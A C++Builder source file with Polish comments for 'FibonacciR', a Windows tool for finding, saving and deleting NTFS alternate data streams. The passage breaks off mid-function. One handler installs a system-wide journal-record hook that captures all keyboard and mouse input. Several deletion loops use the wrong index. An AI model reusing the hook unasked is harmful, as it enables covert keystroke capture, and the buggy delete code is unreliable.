// ---------------------------------------------------------------------------

void __fastcall TFibonacciR::Memo1Change(TObject *Sender)
{
 SHFILEINFO info;
   DWORD result = SHGetFileInfo(Memo1->Text.c_str(), 0, &info,
								sizeof(info), SHGFI_ICON |
								SHGFI_SHELLICONSIZE | SHGFI_SYSICONINDEX);
   if (result != 0)
	  IconList->GetIcon(info.iIcon, ImageSave->Picture->Icon);
   else
	  ImageSave->Picture->Icon->Assign(NULL);
		  Memo1->Lines[1];
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Button3Click(TObject *Sender)
{
 if(g_hLogHook == NULL)
  g_hLogHook = SetWindowsHookEx(WH_JOURNALRECORD, (HOOKPROC)ConnectHook, HInstance,0);

 Application->Minimize();
// Form2->
// ShowWindow(Application->Handle, SW_HIDE);
//ImageList1->GetIcon(1, ImageSave->Picture->Icon);
}

//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Kopiujdoschowka1Click(TObject *Sender)
{
//if ( filecolumn() )
{

OnSetFilesToClipboard( &(Getpath(ListView1->ItemFocused->Caption,1) +  ListView1->ItemFocused->SubItems->Strings[0] ));




//			unique_ptr<TClipboard>pCB(new TClipboard);
//	Clipboard()->SetAsHandle()();

//   Clipboard()->SetAsHandle(CF_BITMAP)    //
	TextFile TF ;

//  AssignFile(TF, "C:\\Clipboard.txt" );
//  try
//    Rewrite(TF);
//    Writeln(TF, ClipBoard.AsText);
//  finally
//	CloseFile(TF);
//
//	unique_ptr<TClipboard>pCB(new TClipboard);
//		unsigned short MyFormat;
//		unsigned int AData;
//		HPALETTE APalette;
//		   pCB->GetAsHandle()
//		Bmp->SaveToClipboardFormat(MyFormat, AData, APalette);
//		pCB->SetAsHandle(MyFormat, AData);
//	Clipboard()->
}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Inne1Click(TObject *Sender)
{
	Pref_ptr = new TSearchPref(this);   //Tworzenie formularza Form2 poprzez zdefiniowanie nowego obiektu frm.
	Pref_ptr->ShowModal();   // wywo³anie nowo utworzonego formularza.

}
//---------------------------------------------------------------------------
void TFibonacciR::CloseScanPrefWnd(){

if (Pref_ptr != NULL)

	delete Pref_ptr;

}
void __fastcall TFibonacciR::PopupMenuSzukajPopup(TObject *Sender)
{
	Dowolne1->Visible 		   = ( S::FiltrSearch == "*.*")   	? false : true;
	Plikitekstowetxt1->Visible = ( S::FiltrSearch == "*.txt") 	? false : true;
	Wszystko1->Visible 		   = ( S::FiltrSearch == "*")	 	? false : true;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::LabelEXTClick(TObject *Sender) {

	LabelEXT->Hint = S::FiltrSearch;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::LabelEXTDblClick(TObject *Sender)
{
	Inne1Click(Sender);
}

//---------------------------------------------------------------------------

 bool TFibonacciR::filecolumn() {

	return (ListView1->Column[1]->ImageIndex == 1) ? true : false;
 }
// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::Usuzaznaczone1Click(TObject *Sender)
{
 if ( ListView1->Checkboxes) {

	unique_ptr<unsigned int> countdel(new unsigned int(0));

	for (int i = ListView1->Items->Count; i > 0; i--)
	{
	  if (ListView1->Items->Item[i-1]->Checked)
	  {
		if ( filecolumn() )
		{
			if ( DeleteFileA(((AnsiString)ListView1->Items->Item[i-1]->Caption + "\\" +
						ListView1->Items->Item[i-1]->SubItems->Strings[0]).c_str()) )
			{
				ListView1->Items->Item[i-1]->Delete();
				(*countdel)++;
			}
		}
		else
		{
			if ( DeleteFileW(( Getpath( ListView1->Items->Item[i-1]->Caption, 0) +
							ListView1->Items->Item[1-1]->SubItems->Strings[0]).c_str() ))
			{

				ListView1->Items->Item[i-1]->Delete();
				(*countdel)++;
			}
		}
	  }
	}
	StatusInfo("Usuniêto: " + (String)*countdel.get() + " plików");
	ListView1->Hint = "Usuniêto: " + (String)*countdel.get() + " plików";
	calcSizeOfList();
 }
}
// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::Usuwszystko1Click(TObject *Sender)
{
	if ( MessageBoxExW(this->Handle,( "Czy napewno chcesz usun¹æ wszystko?\n\nPierwszy:   " +
		ListView1->Items->Item[0]->Caption +   ListView1->Items->Item[0]->SubItems->Strings[0] +
		"\n ...\nOstatni  :   " + ListView1->Items->Item[ListView1->Items->Count-1]->Caption +
		ListView1->Items->Item[ListView1->Items->Count-1]->SubItems->Strings[0] ).c_str(),
		L"FibonacciR Usuñ wszystko",4,1045)) {                                  // strona kodowa PL 1045

	unique_ptr<unsigned int> countdel(new unsigned int(0));

	for (int i = ListView1->Items->Count; i > 0; i--) {

		if ( filecolumn() )
		{
		   if (DeleteFileA(((AnsiString)ListView1->Items->Item[i-1]->Caption + "\\" +
						ListView1->Items->Item[i-1]->SubItems->Strings[0]).c_str()))
			{
			ListView1->Items->Item[i-1]->Delete();                                      // 0 niepowodzenie
			(*countdel)++;
			}
			else                                                             // 1 powodzenie
				 StatusInfo(("Nie uda³o siê usun¹æ: " + ListView1->Items->Item[i-1]->Caption + "\\" +
						ListView1->Items->Item[i-1]->SubItems->Strings[0] +" (" + *countdel + ")"));
		}
		else
		{        ShowMessage(( Getpath(ListView1->Items->Item[i-1]->Caption, 0) +
					ListView1->Items->Item[1-1]->SubItems->Strings[0])) ;
			if ( DeleteFileW(( Getpath(ListView1->Items->Item[i-1]->Caption, 0) +
					ListView1->Items->Item[1-1]->SubItems->Strings[0]).c_str()))
			{
				ListView1->Items->Item[i-1]->Delete();
				(*countdel)++;
			}
			else StatusInfo(("Nie uda³o siê usun¹æ: " +  Getpath(ListView1->Items->Item[i-1]->Caption, 0)  +
					ListView1->Items->Item[1-1]->SubItems->Strings[0] +" (" + *countdel + ")"));
		}

			if (*countdel == ListView1->Items->Count) {
			StatusInfo("Usuniêto " + (int)*countdel.get());
			}
	}
		calcSizeOfList();
		ListView1->Hint = StatusBar1->Panels->Items[0]->Text;
   }
}
//---------------------------------------------------------------------------
void __fastcall TFibonacciR::FormCloseQuery(TObject *Sender, bool &CanClose)
{

//  TRegistryIniFile
 if (reg_save_data) {

   unique_ptr<TRegistry> Reg (new TRegistry);

   if (Reg->OpenKey("Software\\" + FirmName +"\\"+ this->Name, true))
   {
	  Reg->WriteInteger("Left", Left);
	  Reg->WriteInteger("Top", Top);
	  Reg->WriteInteger("Width", Width);
	  Reg->WriteInteger("Height", Height);
   }
 }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::FormCanResize(TObject *Sender, int &NewWidth, int &NewHeight,
          bool &Resize)
{
 ProgressBar1->Width = StatusBar1->Width;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxTimerClick(TObject *Sender)
{
Timer1->Enabled = CheckBoxTimer->Checked;
GroupBoxcurTryb->Enabled = CheckBoxTimer->Checked;
}
//---------------------------------------------------------------------------

 void __fastcall TFibonacciR::ListView1KeyDown(TObject *Sender, WORD &Key, TShiftState Shift)
{
	if ( Key == vkReturn ) {                                                    // okna w³aœciwoœci (Alt + Enter)
		if ( GetKeyState( VK_LMENU ) )
			Properties( &(ListView1->ItemFocused->Caption),
				 &(ListView1->ItemFocused->SubItems->Strings[0]), !filecolumn() );
}


if (ListView1->Items->Count)
  if ( ListView1->ItemIndex > -1)                                               // jeœli item jest zaznaczony
	if ( Key == vkDelete)
	  if ( MessageBoxA( Application->Handle, ((AnsiString)"Czy na pewno chcesz usun¹æ:\n\n" + ListView1->ItemFocused->SubItems->Strings[0]).c_str(), "Potwierdzenie usuwania",
			MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1) == idYes) {

		if (filecolumn()) {

			if ( DeleteFileA(((AnsiString)ListView1->ItemFocused->Caption + "\\" +
						ListView1->ItemFocused->SubItems->Strings[0]).c_str()) )    // jeœli siê powiedzie

			StatusInfo(("Usuniêto: " + ListView1->ItemFocused->Caption + "\\" +
						ListView1->ItemFocused->SubItems->Strings[0]));
			ListView1->ItemFocused->Delete();

		} else {

			if ( DeleteFileA(((AnsiString)ListView1->ItemFocused->Caption +
					ListView1->ItemFocused->SubItems->Strings[0]).c_str()) )

			StatusInfo(("Usuniêto: " + ListView1->ItemFocused->Caption +
					ListView1->ItemFocused->SubItems->Strings[0]));
			ListView1->ItemFocused->Delete();
		}
	  }
}

//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditCurrsorClick(TObject *Sender)
{
S::T.Show(FibonacciR->StatusBar1);
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::naStatusBarze1Click(TObject *Sender)
{
 naStatusBarze1->Checked = !naStatusBarze1->Checked;
 StatusBar1->AutoHint = naStatusBarze1->Checked;
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::Email1Click(TObject *Sender)
{
//ShowMessage((int) ShellExecuteA(Handle, "open", "mailto:herasa@op.pl?subject=Fibonacci Reactivation, errors&body=Opis b³êdu :", NULL, NULL, SW_SHOWNORMAL));
InternetSendBugInfoMail->Execute();
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::StatusBar1Resize(TObject *Sender)
{
StatusBar1->Panels->Items[0]->Width = this->Width-200;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Pulpit2Click(TObject *Sender)
{
  if (filecolumn()) {                                                           // skróty nie obs³uguj¹ dwukropka wiec nie obs³uguj¹ ADS

   if( CreateShortcutLink( "", GetSpecialFolder(CSIDL_DESKTOP) + "\\" +                 // pierwszy parametr to opis
		ExtractFileName(ListView1->ItemFocused->SubItems->Strings[0])	+ ".lnk",
		Getpath( ListView1->ItemFocused->Caption, 1) + ListView1->ItemFocused->SubItems->Strings[0], ""))

	   StatusInfo("Zapisano skrót: " + 	Getpath( ListView1->ItemFocused->Caption, 1) + ListView1->ItemFocused->SubItems->Strings[0]);

   else	ShowError("B³¹d utworzenie skrótu: " + Getpath( ListView1->ItemFocused->Caption, 1) + ListView1->ItemFocused->SubItems->Strings[0]);

  }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Kopiujciek1Click(TObject *Sender)
{                                                                               // kopiuje do showka œcie¿ki dostêpu do pliku
		unique_ptr<TClipboard>pCB(new TClipboard);

	if (filecolumn()) {

		pCB->SetTextBuf( (Getpath(ListView1->ItemFocused->Caption,1) +
						  ListView1->ItemFocused->SubItems->Strings[0]).c_str() ); //dla plików
	} else {
		pCB->SetTextBuf( (ListView1->ItemFocused->Caption +
						ListView1->ItemFocused->SubItems->Strings[0]).c_str()); 	// dla ADS
	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Pulpit1Click(TObject *Sender)
{
if (filecolumn()) {                                                           // skróty nie obs³uguj¹ dwukropka wiec nie obs³uguj¹ ADS

   if( CreateShortcutLink( "", ExtractFileName(ListView1->ItemFocused->SubItems->Strings[0])	+ ".lnk",
		Getpath( ListView1->ItemFocused->Caption, 1) + ListView1->ItemFocused->SubItems->Strings[0], ""))

	   StatusInfo("Zapisano skrót: " + Getpath( ListView1->ItemFocused->Caption, 1) + ListView1->ItemFocused->SubItems->Strings[0]);

   else	ShowError("B³¹d utworzenie skrótu: " + Getpath( ListView1->ItemFocused->Caption, 1) + ListView1->ItemFocused->SubItems->Strings[0]);

  }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Zapisz1Click(TObject *Sender)
{
	unique_ptr<TSaveDialog> dlg(new TSaveDialog(this));
	unique_ptr<String> ext(new String("*" + ExtractFileExt( ListView1->ItemFocused->SubItems->Strings[0])));

	(*dlg).Title = "Zapisz ADS: \"" + ListView1->ItemFocused->SubItems->Strings[0] + "\" do pliku";

	(*dlg).DefaultExt = ExtractFileExt( ListView1->ItemFocused->SubItems->Strings[0] );
	(*dlg).Filter =  "ADS Extension(" + *ext + ")|" + *ext + "|Text (*.txt)|*.txt|Default File (*.*)|*.*|";
	(*dlg).FileName = ExtractFileName( ListView1->ItemFocused->SubItems->Strings[0].Delete(1,1) );

	if ((*dlg).Execute(Application->Handle)) {

//		if ((*dlg).FileName == "")   StatusInfo("Nie zapisano " + ListView1->ItemFocused->SubItems->Strings[0] +", nie podano nazwy pliku");
//		else
//		{
			unique_ptr<TMemoryStream> M(new TMemoryStream);                     // kopiowanie ADS
			 M->Position = 0;
			 M->LoadFromFile( ListView1->ItemFocused->Caption + ListView1->ItemFocused->SubItems->Strings[0] );
			 M->Position = 0;
			 M->SaveToFile((*dlg).FileName);
//		}
	}
}
//---------------------------------------------------------------------------

//	   [Window Title]
//FibonacciR
//
//[Content]
//B³¹d tworzenia procesu z œcie¿ki: C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll C:\Users\Puler\Desktop\save31.psd:GiewontTEST.jpg
//
//[OK]

bool TFibonacciR::CheckFileSystem( TButtonedEdit* edit ) {

	unique_ptr<wchar_t> aName(new wchar_t[255] );
	unique_ptr<wchar_t> aFileSystem(new wchar_t[255] );

	String ldysku = ExtractFileDrive(edit->Text);

	GetVolumeInformationW( (ldysku + "\\").c_str(), aName.get(), sizeof(aName),
							NULL, 0, 0, aFileSystem.get(), sizeof(aFileSystem));

	ldysku = aFileSystem.get();

	 if ( ldysku == "NTFS") {

			edit->LeftButton->Hint = "System plików: " + ldysku;

		if ( access( ToArrW( &(edit->Text) ) , F_OK) != 0 )                		// czy istnieje
		{
			edit->LeftButton->Visible = true;
			edit->LeftButton->ImageIndex = 23;
			edit->Hint = "Podana œcie¿ka nie istnieje";
		}
		else if ( access( ToArrW( &(edit->Text) ) , W_OK) != 0 ) 				// jeœli nie ma dostêpu do zapisu
		{
			edit->LeftButton->Visible = true;
			edit->LeftButton->ImageIndex = 14;
			edit->Hint = "Brak dostêpu zapisu do lokalizacji: " + edit->Text;
		}

		else
			edit->LeftButton->Visible = false;
	 }
	 else
	 {
		edit->LeftButton->Hint = "System plików niepoprawny (NTFS only): " + ldysku;
		edit->LeftButton->ImageIndex = 23;                              // zmieniæ ikonê (no NTFS)
		edit->LeftButton->Visible = true;
	 }
	 return 0;
}

//---------------------------------------------------------------------------

void TFibonacciR::IsDir_noFile_Path( TButtonedEdit* edit ) {

	String s = edit->Text;

	if ( DirectoryExists( s ) )	return;

	if ( FileExists( s ) )
	{
	  if ( s.LastDelimiter("\\") )
			s.Delete( s.LastDelimiter("\\"), 256 );

	  else if ( s.LastDelimiter("/") )
		s.Delete( s.LastDelimiter("/"), 256 );

	  edit->Text = s;
	}
}


//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditADSSaveChange(TObject *Sender) {

	if (access( ToArrW( &(EditADSSave->Text) ) , W_OK) == 0)
		EditADSSave->Color = clWebGreenYellow;
	else
	{
		if( EditADSSave)
		EditADSSave->Color = clWebSalmon;
		StatusInfo("Nie mo¿na zapisywaæ przez podan¹ lokalizacjê (wybierz inn¹)");
		EditValidPath( (TEdit*) EditADSSave, W_OK);                            	// zaznacza niepoprawn¹ czêœæ œcie¿ki
	}

	EditADSSave->Hint = EditADSSave->Text; //SetFocusedControl(this);
	if (EditADSSave->RightButton->ImageIndex == 22 )
	{
		ButtonedEditSearch->Text = EditADSSave->Text;
		ButtonedEditSearch->Color = EditADSSave->Color;
	}

	CheckFileSystem( (TButtonedEdit*) Sender );
}

// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::ButtonedEditSearchChange(TObject *Sender) {

	if ( Dir_File_exist((TEdit*)Sender) )

		ButtonedEditSearch->Color = clWebGreenYellow;
	else
	{
		EditValidPath((TEdit*)ButtonedEditSearch, F_OK);
		ButtonedEditSearch->Color = clWebSalmon;
	}
//	 EditADSSave->SetFocus() ;
	ButtonedEditSearch->Hint = ButtonedEditSearch->Text;
		if (ButtonedEditSearch->RightButton->ImageIndex == 22 )
		{
			EditADSSave->Text = ButtonedEditSearch->Text;
			EditADSSave->Color = ButtonedEditSearch->Color;   	                // usuwa plik z œcie¿ki

		}
}//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditADSSaveDblClick(TObject *Sender)
{
	unique_ptr<String> Dir(new String( ( EditADSSave->Text != "") ? EditADSSave->Text : (String)"C:" ));

 if (SelectDirectory("Otwórz", String("2").w_str(), *Dir,
		   TSelectDirExtOpts() << sdNewUI << sdNewFolder << sdShowShares << sdShowFiles))

	EditADSSave->Text = *Dir;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditADSSaveClick(TObject *Sender) {

	if ( access( ToArrW( &( static_cast<TEdit*>(Sender)->Text) ) , W_OK) == 0 )       // sender
		static_cast<TEdit*>(Sender)->Color = clWindow;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditADSSaveKeyDown(TObject *Sender, WORD &Key, TShiftState Shift) {

//ShowMessage( Shift);
	EditKeyDown( (TEdit*)EditADSSave, Key);
	EditADSSave->OnClick(EditADSSave);
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ListViewDropDblClick(TObject *Sender)
{
	if ( EditADSSave->Text == "" ) {

		StatusInfo( "Nie podano œcie¿ki zapisu" );
		if ( EditADSSave->CanFocus() )
			 EditADSSave->SetFocus();
		return;
	}


if (ListViewDrop->Items->Count) {

	try{

	unique_ptr<String> Path_to_save(new String(EditADSSave->Text));
	unique_ptr<String> FileName(new String( ListViewDrop->ItemFocused->SubItems->Strings[0] ));

		 *FileName 	 =   U::ApplyPref1( *FileName );
//		 *Path_to_save = U::ApplyPref2( *Path_to_save );

Kopiuj( ListViewDrop->ItemFocused->Caption +"\\"+ ListViewDrop->ItemFocused->SubItems->Strings[0] ,  // co
											 *Path_to_save,						// gdzie
												 *FileName); 					// nazwa


	ListViewDrop->Items->Item[0]->StateIndex = 1;

   }catch (Exception &exception) {

		ShowError("Wyj¹tek ListBox1DblClick()", &exception, Sender);
	}
   catch(...){
		ShowError("B³¹d ListBox1DblClick()",0,Sender);
   }
}
}
//---------------------------------------------------------------------------



void __fastcall TFibonacciR::Eksportujlist1Click(TObject *Sender)
{
	unique_ptr<TSaveDialog> dlg(new TSaveDialog(this));
	unique_ptr<String> ext(new String("*" + ExtractFileExt( ListView1->ItemFocused->SubItems->Strings[0])));

	(*dlg).Title 		= "Eksportuj listê do pliku";
	(*dlg).DefaultExt 	= "*.txt";
	(*dlg).Filter 		= "Text (*.txt)|*.txt|Default File (*.*)|*.*|";
	(*dlg).FileName 	= "FiboASDlist.txt";

	if ((*dlg).Execute(Application->Handle)) {

		unique_ptr<ofstream> list(new ofstream);

		(*list).open((*dlg).FileName.c_str(), ios::out | ios::app);

	TCHAR buffer[256] = TEXT("");
	DWORD dwSize = sizeof(buffer);
	GetComputerNameEx( 0, buffer, &dwSize);                                     // param 1 is "NetBIOS"

		*list << endl <<
		"Lista alternatywnych strumieni danych (ADS)" << endl <<
		"Program:    " << ToArrW(&(this->Name)) << " " << AnsiString(::GetFileVersion(ParamStr(0))).c_str() << endl <<
		"U¿ytkownik: " << AnsiString(buffer).c_str() << endl <<
		"[ " << GetDataTime().c_str() << " ]\n\n";

		for (int i = 0; i < ListView1->Items->Count; i++) {

		*list << setw(2) << right << i + 1 << "	" <<
		setw(40) << left << ((AnsiString)ListView1->Items->Item[i]->Caption).c_str() <<
		setw(35) << left << ((AnsiString)ListView1->Items->Item[i]->SubItems->Strings[0]).c_str() <<
		setw(30) << internal << ((AnsiString)ListView1->Items->Item[i]->SubItems->Strings[1]).c_str() << endl;

		}
		(*list).close();

		OpenFolderSelectFile( (*dlg).FileName.c_str() );
    }
}
//---------------------------------------------------------------------------
 #include "Thread.h"

int Start_Stop_Watek( TButton *Btn )
{
	// Tak po partyzancku na szybko, ¿eby pokazaæ ¿e to dzia³a, oczywiœcie mo¿na to lepiej zrobiæ
	if( 	 Btn->Tag == 0 )
	{
		if( Btn->Caption == "Watek 1 START" )
		{
			Btn->Caption  = "Watek 1 STOP";

			Startuj_Watek( 0 );
		}
		else
		{
			Btn->Caption  = "Watek 1 START";

			Rozlacz_Watek( 0 );
		}
	}
	else if( Btn->Tag == 1 )
	{
		if( Btn->Caption == "Watek 2 START" )
		{
			Btn->Caption  = "Watek 2 STOP";

			Startuj_Watek( 1 );
		}
		else
		{
			Btn->Caption  = "Watek 2 START";

			Rozlacz_Watek( 1 );
		}
	}



	return 0;
}
void __fastcall TFibonacciR::Button5Click(TObject *Sender)
{
	Start_Stop_Watek( ( TButton* )Sender );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::InternetSendBugInfoMailUpdate(TObject *Sender)
{
	InternetSendBugInfoMail->Recipients->Add()->DisplayName = "herasa@op.pl";
	InternetSendBugInfoMail->Subject = "Fibonacci Reactivation " + ::GetFileVersion( ParamStr(0) );

	//InternetSendBugInfoMail->Text->Add("Version :" + ::GetFileVersion( ParamStr(0) ));
	InternetSendBugInfoMail->UTF8Encoded = false;                               // polskie znaki
	InternetSendBugInfoMail->Text->Append( "Wiadomoœæ o b³êdzie zosta³a wygenerowana automatycznie." );    // brak polskich znaków
	InternetSendBugInfoMail->Text->Append( "\nMo¿esz dodaæ screeny lub opis b³êdu/pomys³u na udoskonalenie programu." );    // brak polskich znaków

	if (FileExists( S::NAMElog + ".log", false))

		InternetSendBugInfoMail->Attachments->Add( S::NAMElog + ".log" );

//ShellExecuteA(Handle, "open", "mailto:?subject=, errors&body=Opis b³êdu :", NULL, NULL, SW_SHOWNORMAL));

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::wy1KeyUp(TObject *Sender, WORD &Key, TShiftState Shift)

{
FibonacciR->FiFloat->Key_Up( (TEdit*) Sender );
FiFloat->save();
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditADSSaveRightButtonClick(TObject *Sender)
{
	if ( EditADSSave->RightButton->ImageIndex == 20)
		 EditADSSave->RightButton->ImageIndex  = 22;
	else EditADSSave->RightButton->ImageIndex  = 20;

 ButtonedEditSearch->RightButton->ImageIndex = EditADSSave->RightButton->ImageIndex; // synchronizacja ikonek editów
 S::test = EditADSSave->Text; // synchronizacja ikonek editów

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonedEditSearchRightButtonClick(TObject *Sender)
{
	if ( ButtonedEditSearch->RightButton->ImageIndex == 20 )
		 ButtonedEditSearch->RightButton->ImageIndex  = 22;
	else ButtonedEditSearch->RightButton->ImageIndex  = 20;

 EditADSSave->RightButton->ImageIndex = ButtonedEditSearch->RightButton->ImageIndex; // synchronizacja ikonek editów
 S::test = EditADSSave->Text; // synchronizacja ikonek editów
 ButtonedEditSearch->Text = S::test;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonedEditSearchDblClick(TObject *Sender)
{
	unique_ptr<String> Dir(new String(ButtonedEditSearch->Text));

	if ( access( ToArrW( Dir.get() ), F_OK) != 0 ) *Dir = GetSpecialFolder(CSIDL_CONTROLS); // gdy nie istnieje

	if (SelectDirectory("Otwórz", WideString(L"*.*"), *Dir, TSelectDirExtOpts() << sdNewUI << sdNewFolder << sdShowShares << sdShowFiles ))

	ButtonedEditSearch->Text = *Dir;
	ButtonedEditSearch->TextHint = *Dir;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonedEditSearchKeyDown(TObject *Sender, WORD &Key,
		  TShiftState Shift) {

	EditKeyDown( (TEdit*) Sender, Key);                                         // obs³uga klawiszy del backspace
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonedEditSearchKeyPress(TObject *Sender, System::WideChar &Key)
{
	if (Key == 13) { // enter
		// ShowMessage("Wciœniêto kombinacjê klawiszy enter");
		Key = 0;                                                                // nie s³ychac wciœniêcia (Systemowego dzwiêku)
		ButtonSzukajClick(Sender);
	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::StatusBar1CreatePanelClass(TCustomStatusBar *Sender,
		  TStatusPanelClass &PanelClass)
{
	S::ptr->SetParentComponent( FibonacciR );
}
//---------------------------------------------------------------------------

  void TFibonacciR::ResetIconList( unsigned size ) {

	if ( size ) //{

//		unique_ptr< int > count (new int ( IconList->Count ));
//		unique_ptr<TImageList> list(new TImageList(IconList));
//		unique_ptr<TImage> image(new TImage(this));
//			unique_ptr<TDBImage> db(new TDBImage(IconList));
//
//		for (int i = 0; i < *count; i++) {
//								// (*db).Picture->Assign( IconList->GetImageBitmap() );
////			IconList->GetIcon()
////			(*image).Picture->Bitmap->Handle =  IconList->GetImageBitmap();     // not work
//
//			IconList->GetIcon( i, (*image).Picture->Icon );
//			(*list).AddIcon( (*image).Picture->Icon );
//
////			(*list).Add( (*image).Picture->Bitmap,0 );
//		}
////		 ShowMessage( (*list).Count );
////         ShowMessage( (*db).Picture->Graphic->LoadFromStream( ) );                ///////////////
//		IconList->SetSize( size, size );
////		 ShowMessage( IconList->Count );
//		for (int i = 0; i < (*list).Count; i++) {
//			IconList->AddImage( list.get() , i);
//		}
		IconList->SetSize( size, size );
		IconList->Clear();
		IconList->AddImages( IconMain32 );


//	}
//	else
//	{
//	IconList->AddImage( ImageList1, 4);                                         //0
//	IconList->AddImage( ImageList1, 5);                                         //1
//	IconList->AddImage( ImageList1, 6);                                         //2
//	IconList->AddImage( ImageList1, 10);                                        //3
//	IconList->AddImage( ImageList1, 16);                                        //4 fajka powodzenia
//	IconList->AddImage( ImageList1, 23);                                        //5 niepowodzenie krzy¿yk czerwony
//	}
	if ( Form2)
	{
	FibonacciR->IconList->SetSize(Form2->TrackBarIconSize->Position, Form2->TrackBarIconSize->Position);
	FibonacciR->IconList->Clear();
	FibonacciR->IconList->AddImages( FibonacciR->IconMain32 );
	FibonacciR->StatusInfo(FibonacciR->IconList->Count);
	}
}

// ---------------------------------------------------------------------------


void __fastcall TFibonacciR::SzukajADS1Click(TObject *Sender)
{
 ButtonedEditSearch->Text =
 (Getpath(ListView1->ItemFocused->Caption,1) + ListView1->ItemFocused->SubItems->Strings[0]).c_str();
 ListView1->Column[1]->ImageIndex = 0;
 ButtonSzukaj->Click();
 }
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::UpdateAppClick(TObject *Sender)
{
	ShellExecuteA(0, "open", "https://mega.nz/#F!CMpx3ZKT!crQQEa3JOpqt14AHLY1ORw", "", "", 5);
}
//---------------------------------------------------------------------------

void TFibonacciR::Loading_image_success( bool yes )
{
	ButtonKonwertuj->Enabled = yes;

	if ( yes ) {
		PanelImage->BevelKind = TBevelKind::bkNone;
	}
	else
	{
			if( ImagePreview->Picture->Bitmap->Width == 0 )ImagePreview->Picture->Bitmap->Assign(NULL);                       	// czyœci miniaturkê
			ImagePreview->Picture->Assign(NULL);                      			// czyœci miniaturkê
			PanelImage->BevelKind = TBevelKind::bkTile;
			ImagePreview->Hint = "Kliknij, wybierz obraz";
	}
}

//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ImagePreviewClick(TObject *Sender)
{
	unique_ptr<TOpenPictureDialog> dialog(new TOpenPictureDialog(0));

	if ((*dialog).Execute(Application->Handle))
	{
	//	if ( filesize(AnsiString((*dialog).FileName).c_str()) <= 1559965 ) {
	//
	//		ShowMessage("Rozmiar pliku: " + GetSize(filesize( AnsiString((*dialog).FileName).c_str() )) + "\nMaksymalny rozmiar: " + GetSize(34342) );
	//		return;
	//	}

		Loading_image_success( GdiPlus->Load_Image( ImagePreview, &((*dialog).FileName) ) );

		ImagePreview->Hint = ExtractFileName((*dialog).FileName) + " \n" + ImagePreview->Picture->Height + "x" +
				ImagePreview->Picture->Width +" px\n" + GetSize(filesize( AnsiString((*dialog).FileName).c_str() ));

	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::RadioButtonSourseFileClick(TObject *Sender)
{
	EditBatchOut->LeftButton->ImageIndex = 0;
}
//---------------------------------------------------------------------------
	 #include <Wininet.h>
void __fastcall TFibonacciR::ImagePreviewProgress(TObject *Sender, TProgressStage Stage,
          BYTE PercentDone, bool RedrawNow, const TRect &R, const UnicodeString Msg)

{
	Application->ProcessMessages();
	PanelImage->BevelKind = bkNone;
	if ( ButtonKonwertuj->CanFocus() )
//		ButtonKonwertuj->SetFocus();
	ImagePreview->Repaint();
	ImagePreview->Update();
	ProgressBarPos( PercentDone );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditLocalizationChange(TObject *Sender)
{
	RadioButtonLocalization->Checked = true;
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::CheckBoxclipkonwersjaClick(TObject *Sender)
{
	RadioButtonPulpit->Enabled 			= !CheckBoxclipkonwersja->Checked;
	RadioButtonAcctualfolder->Enabled 	= !CheckBoxclipkonwersja->Checked;
	RadioButtonSourseFile->Enabled		= !CheckBoxclipkonwersja->Checked;
	RadioButtonLocalization->Enabled 	= !CheckBoxclipkonwersja->Checked;
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::Waciwoci1Click(TObject *Sender)
{
	Properties( &(ListViewDrop->ItemFocused->Caption), &(ListViewDrop->ItemFocused->SubItems->Strings[0]), false );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::PopupMDropedPopup(TObject *Sender)
{
	bool b = (ListViewDrop->Items->Count > 0) ? true : false;

	Usu1->Enabled 		= b;
	Waciwoci1->Enabled 	= b;
}
//---------------------------------------------------------------------------

   #pragma warn +csu
double foo(double u, double i)
{
 double z = u - i;
 return z;
}
//--------------------------------
//BOOL sDirection = true;
int __stdcall CustomAutoSort(long Item1, long Item2, long lParam)
{
 bool test = true;
 String cTemp1, cTemp2;
 int c = ((TListView *)lParam)->Tag - 1;
 if(c == -1)
 {
  cTemp1 = ((TListItem *)Item1)->Caption;
  cTemp2 = ((TListItem *)Item2)->Caption;
 }
 else
 {
  cTemp1 = ((TListItem *)Item1)->SubItems->Strings[c];
  cTemp2 = ((TListItem *)Item2)->SubItems->Strings[c];
 }

 double rTemp1, rTemp2;

 try{ rTemp1 = cTemp1.Trim().ToDouble(); } catch(...){ test = false;}
